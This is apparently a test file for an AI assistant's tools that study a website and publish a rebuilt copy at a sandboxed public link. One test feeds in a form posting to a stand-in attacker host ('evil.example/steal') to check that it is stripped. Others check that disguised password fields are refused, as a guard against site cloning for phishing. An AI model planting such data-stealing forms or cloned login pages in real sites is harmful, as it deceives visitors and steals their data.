// Rebuilding a website: study it, publish an improved version at a public, sandboxed link.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { webcrypto } from 'node:crypto';

const S = await import('./.build/tools/sites.mjs');
const T = await import('./.build/tools/index.mjs');
const brain = await import('./.build/brain.mjs');

const PAGE = `<!doctype html><html lang="en"><head><title>Acme Bakery</title>
<meta name="description" content="Fresh bread in Leeds"><meta name="theme-color" content="#b5651d">
<link rel="stylesheet" href="/css/site.css"><link href="https://fonts.googleapis.com/css2?family=Lora&display=swap" rel="stylesheet">
<script src="https://code.jquery.com/jquery.min.js"></script><script src="https://www.googletagmanager.com/gtag/js?id=G-1"></script></head>
<body><header><nav><a href="/">Home</a><a href="/menu">Menu</a><a href="https://acme.example/contact">Contact</a><button class="navbar-toggler" aria-expanded="false">☰</button></nav></header>
<main><section id="hero" class="hero big"><h1>Bread worth waking up for</h1><p>Sourdough baked every morning since 1998.</p><img src="/img/loaf.jpg" alt="A sourdough loaf"></section>
<section class="carousel"><h2>Our favourites</h2><div class="slick-slide"><img data-src="img/bun.jpg" alt="Cinnamon bun"></div></section>
<section><h2>Visit us</h2><p>12 Market St, Leeds</p><form action="https://acme.example/subscribe"><input type="email" name="e"></form></section></main>
<footer><p>© Acme</p></footer></body></html>`;
const CSS = 'body{font-family:"Lora",serif;color:#3b2a1a;background:#fff8ef}.btn{background:#b5651d;color:#fff8ef}h1{color:#b5651d}';

test('study_site describes the structure, text, images, colours, fonts and scripts of a page', async () => {
  const real = globalThis.fetch;
  globalThis.fetch = async (input) => {
    const url = typeof input === 'string' ? input : input.url;
    if (url === 'https://acme.example/') return new Response(PAGE, { headers: { 'content-type': 'text/html' } });
    if (url === 'https://acme.example/css/site.css') return new Response(CSS, { headers: { 'content-type': 'text/css' } });
    return new Response('', { status: 404 });
  };
  try {
    const out = await T.toolByName.get('study_site').run({ url: 'acme.example/' }, {});
    assert.match(out, /TITLE: Acme Bakery/);
    assert.match(out, /DESCRIPTION: Fresh bread in Leeds/);
    assert.match(out, /PAGE STRUCTURE \(in order\): header > nav > main > section#hero\.hero\.big > section\.carousel > section > footer/);
    assert.match(out, /Menu → https:\/\/acme\.example\/menu/);
    assert.match(out, /h1 Bread worth waking up for/);
    assert.match(out, /https:\/\/acme\.example\/img\/loaf\.jpg — "A sourdough loaf"/);
    assert.match(out, /https:\/\/acme\.example\/img\/bun\.jpg/, 'lazy-loaded images found too');
    assert.match(out, /COLOURS \(most used first\): .*#b5651d.*#3b2a1a/);
    assert.match(out, /FONTS: Lora/);
    assert.match(out, /jquery/);
    assert.match(out, /googletagmanager/);
    assert.match(out, /mobile menu toggle/);
    assert.match(out, /carousel/);
    assert.match(out, /NO mobile viewport tag/);
    assert.match(out, /Sourdough baked every morning/);
    assert.match(out, /call publish_site/);
  } finally {
    globalThis.fetch = real;
  }
});

test('a rebuilt page is made safe and phone-ready before it goes live', () => {
  const { html, notes } = S.prepareSite('<!doctype html><html><head><title>A</title></head><body><img src="x.jpg"><form action="https://evil.example/steal" method="post"><input name="e"><button formaction="https://evil.example/2">Go</button></form></body></html>', 'https://acme.example/');
  assert.match(html, /name="viewport"/);
  assert.match(html, /<img loading="lazy" decoding="async" src="x.jpg">/);
  assert.match(html, /noindex/);
  assert.doesNotMatch(html, /evil\.example/, 'form action and formaction removed');
  assert.equal(notes.length, 3);
  assert.throws(() => S.prepareSite('<html><body><input type="password"></body></html>', 'https://bank.example'), /password fields/);
  assert.throws(() => S.prepareSite('<html><body><input type="pass&#119;ord"></body></html>', ''), /password fields/, 'disguised with a character reference');
  assert.throws(() => S.prepareSite('<html><body><input type="pass&#x77;ord"></body></html>', ''), /password fields/);
  assert.throws(() => S.prepareSite("<html><body><script>i.type='password'</script></body></html>", ''), /password fields/, 'made by a script');
  assert.throws(() => S.prepareSite('<div>just a fragment</div>', ''), /ONE complete HTML document/);
  assert.throws(() => S.prepareSite(`<html><body>${'x'.repeat(400_001)}</body></html>`, ''), /too large/);
});

test('publish_site asks the owner first, showing exactly what goes live where', async () => {
  const tool = T.toolByName.get('publish_site');
  const brain2 = await import('./.build/brain.mjs');
  void brain2;
  const ask = await tool.approval({ name: 'acme', title: 'Acme', source_url: 'https://acme.example/', html: '<html><body>x</body></html>' }, { origin: 'https://g.example' });
  assert.match(ask.reason, /Publish "Acme" \(rebuilt from acme\.example\) as a public page at https:\/\/g\.example\/s\/acme\?/);
  await assert.rejects(tool.approval({ name: 'bank', html: '<html><body><input type=password></body></html>' }, {}), /password fields/);
});

test('publish_site puts the page live at a public link that anyone can open, sandboxed', async () => {
  class MemStorage {
    m = new Map();
    async get(k) { return this.m.has(k) ? structuredClone(this.m.get(k)) : undefined; }
    async put(k, v) { this.m.set(k, structuredClone(v)); }
    async delete(k) { return this.m.delete(k); }
    async list({ prefix = '' } = {}) { return new Map([...this.m].filter(([x]) => x.startsWith(prefix))); }
    async setAlarm() {}
    async getAlarm() { return null; }
  }
  const storage = new MemStorage();
  const events = [];
  const out = await T.toolByName.get('publish_site').run(
    { name: 'Acme Bakery!', title: 'Acme Bakery — rebuilt', source_url: 'https://acme.example/', html: '<!doctype html><html><head><meta name="viewport" content="width=device-width"><title>Acme</title></head><body><h1>Bread</h1></body></html>' },
    { storage, emit: (e) => events.push(e), origin: 'https://ghosty.example.workers.dev' },
  );
  assert.match(out, /live now at https:\/\/ghosty\.example\.workers\.dev\/s\/acme-bakery/);
  assert.deepEqual(events[0], { t: 'client', name: 'show_link', args: { url: 'https://ghosty.example.workers.dev/s/acme-bakery', title: 'Acme Bakery — rebuilt' } });

  // Served by the Worker to anyone, without signing in.
  const state = { storage, waitUntil() {}, blockConcurrencyWhile: (f) => f() };
  const env = { OWNER_KEY: 'k'.repeat(32), VAULT_KEY: Buffer.from(webcrypto.getRandomValues(new Uint8Array(32))).toString('base64') };
  let agent;
  env.AGENT = { idFromName: () => 'owner', get: () => ({ fetch: (r) => (agent ??= new brain.GhostyAgent(state, env)).fetch(r) }) };
  const go = (path, headers = {}) => brain.default.fetch(new Request(`https://ghosty.example.workers.dev${path}`, { headers }), env, { waitUntil() {} });
  // What a visitor opens: Ghosty's own page, with the bar, framing the rebuilt page.
  const r = await go('/s/acme-bakery', { 'sec-fetch-site': 'cross-site', 'sec-fetch-dest': 'document' });
  assert.equal(r.status, 200);
  const wrap = await r.text();
  assert.match(wrap, /Rebuilt by Ghosty from acme\.example · not the official site/);
  assert.match(wrap, /<iframe src="\/s\/acme-bakery\/page"[^>]*sandbox="allow-scripts allow-popups allow-popups-to-escape-sandbox allow-modals"/);
  assert.doesNotMatch(wrap, /allow-forms|allow-same-origin/);
  assert.match(r.headers.get('content-security-policy'), /default-src 'none'.*frame-src 'self'/);
  assert.doesNotMatch(r.headers.get('content-security-policy'), /script-src/, 'the bar page runs no scripts');
  assert.match(r.headers.get('x-robots-tag'), /noindex/);
  // The rebuilt page, in the frame: locked down by the browser.
  const f = await go('/s/acme-bakery/page', { 'sec-fetch-dest': 'iframe' });
  assert.equal(f.status, 200);
  assert.match(await f.text(), /<h1>Bread<\/h1>/);
  const csp = f.headers.get('content-security-policy');
  assert.match(csp, /^sandbox allow-scripts/);
  for (const rule of ["connect-src 'none'", "form-action 'none'", "script-src 'unsafe-inline'", "frame-ancestors 'self'", "base-uri 'none'"]) assert.ok(csp.includes(rule), rule);
  assert.doesNotMatch(csp, /allow-same-origin|allow-forms/, "can't reach Ghosty's storage or keys, can't submit forms");
  // Opened directly, it goes back to the page with the bar.
  const direct = await go('/s/acme-bakery/page', { 'sec-fetch-dest': 'document' });
  assert.equal(direct.status, 302);
  assert.equal(direct.headers.get('location'), '/s/acme-bakery');
  assert.equal((await brain.default.fetch(new Request('https://ghosty.example.workers.dev/s/nope'), env, { waitUntil() {} })).status, 404);
  // the API itself still needs the owner
  assert.equal((await brain.default.fetch(new Request('https://ghosty.example.workers.dev/api/site/acme-bakery'), env, { waitUntil() {} })).status, 401);
});

test('the site tools are offered when the owner gives a URL or asks for a website', () => {
  const names = (msg) => T.selectTools(msg, new Set(), false).map((t) => t.name);
  assert.ok(names('rebuild https://acme.example and make it better').includes('study_site'));
  assert.ok(names('recreate the website stripe.com for me').includes('publish_site'));
  assert.ok(!names("what's the weather tomorrow").includes('study_site'));
});

test('a site that builds itself with JavaScript is read rendered, so its content is still there', async () => {
  const real = globalThis.fetch;
  const asked = [];
  globalThis.fetch = async (input) => {
    const url = typeof input === 'string' ? input : input.url;
    asked.push(url);
    if (url === 'https://app.example/') return new Response('<!doctype html><html><head><title>App</title><script src="/bundle.js"></script></head><body><div id="root"></div></body></html>', { headers: { 'content-type': 'text/html' } });
    if (url === 'https://r.jina.ai/https://app.example/') return new Response('# Plan your trips\n\nTrack flights and hotels in one place.', { headers: { 'content-type': 'text/plain' } });
    return new Response('', { status: 404 });
  };
  try {
    const out = await T.toolByName.get('study_site').run({ url: 'https://app.example/' }, {});
    assert.match(out, /RENDERED CONTENT/);
    assert.match(out, /Track flights and hotels in one place/);
  } finally {
    globalThis.fetch = real;
  }
});
